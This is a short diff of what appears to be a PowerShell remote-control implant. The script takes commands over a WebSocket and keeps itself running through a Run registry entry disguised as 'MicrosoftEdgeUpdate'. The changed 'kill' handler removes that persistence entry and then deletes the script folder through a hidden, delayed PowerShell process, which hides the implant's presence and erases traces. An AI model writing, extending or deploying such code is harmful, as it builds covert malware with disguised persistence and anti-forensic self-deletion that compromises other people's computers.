@@ -122,8 +122,11 @@ while ($ws.State -eq "Open") {
             }
 
             elseif ($cmd.type -eq "kill") {
-                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftEdgeUpdate"
-                Remove-Item -Path $scriptDir -Recurse -Force
+                $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+                if (Get-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate" -ErrorAction SilentlyContinue) {
+                    Remove-ItemProperty -Path $regPath -Name "MicrosoftEdgeUpdate"
+                }
+                Start-Process powershell -ArgumentList "-Command `"Start-Sleep 2; Remove-Item -Path '$scriptDir' -Recurse -Force`"" -WindowStyle Hidden
                 exit
             }
 
